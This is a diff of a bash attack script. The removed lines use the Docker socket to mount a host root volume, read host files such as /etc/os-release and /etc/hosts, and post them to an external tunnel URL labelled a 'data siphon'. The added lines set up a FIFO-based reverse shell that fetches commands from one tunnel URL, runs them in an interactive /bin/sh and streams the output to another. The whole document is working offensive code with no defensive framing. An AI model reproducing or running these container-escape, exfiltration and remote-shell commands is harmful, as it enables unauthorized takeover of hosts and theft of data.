@@ -1,34 +1,13 @@
 #!/bin/bash
-# TARGET: 0a2cb60346f2cd12-103-95-173-85.serveousercontent.com
-URL="https://0a2cb60346f2cd12-103-95-173-85.serveousercontent.com"
+# OUTPUT (9999) and INPUT (9998)
+URL_OUT="https://0a2cb60346f2cd12-103-95-173-85.serveousercontent.com"
+URL_IN="https://c1f05e8ba787d658-103-95-173-85.serveousercontent.com"
 
-{
-  echo "=== [!] SYSTEM DATA SIPHON: ACTIVE ==="
-  echo "Timestamp: $(date)"
-  
-  # Identify the local image ID
-  IMG=$(curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | grep -oE '"Id":"sha256:[a-f0-9]+"' | head -1 | cut -d'"' -f4)
+# Create a backpipe
+rm -f /tmp/f; mkfifo /tmp/f
 
-  # Create a bridge container to access the host-root volume
-  ID=$(curl -s -X POST --unix-socket /var/run/docker.sock \
-    -H "Content-Type: application/json" \
-    -d "{
-      \"Image\": \"$IMG\",
-      \"HostConfig\": { \"Binds\": [\"p0_root:/host_data:ro\"] }
-    }" http://localhost/containers/create | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)
-
-  if [ -n "$ID" ]; then
-    echo "[+] Extraction Bridge Created: $ID"
-    
-    echo "--- [1] HOST OS IDENTIFICATION ---"
-    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/os-release" | tar -xO 2>&1
-    
-    echo -e "\n--- [2] HOST NETWORK CONFIGURATION ---"
-    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$ID/archive?path=/host_data/etc/hosts" | tar -xO 2>&1
-
-    # Cleanup: Remove the temporary container
-    curl -s -X DELETE --unix-socket /var/run/docker.sock "http://localhost/containers/$ID?force=true" > /dev/null
-  else
-    echo "ERROR: Failed to establish bridge. Verify socket permissions."
-  fi
-} | curl -s -X POST --data-binary @- "$URL"
+# The Bridge Logic:
+# 1. Read from the Pipe -> Send to Output URL (9999)
+# 2. Read from the Input URL (9998) -> Send to Shell -> Write to Pipe
+cat /tmp/f | curl -s -T - "$URL_OUT" & 
+curl -s "$URL_IN" | /bin/sh -i > /tmp/f 2>&1
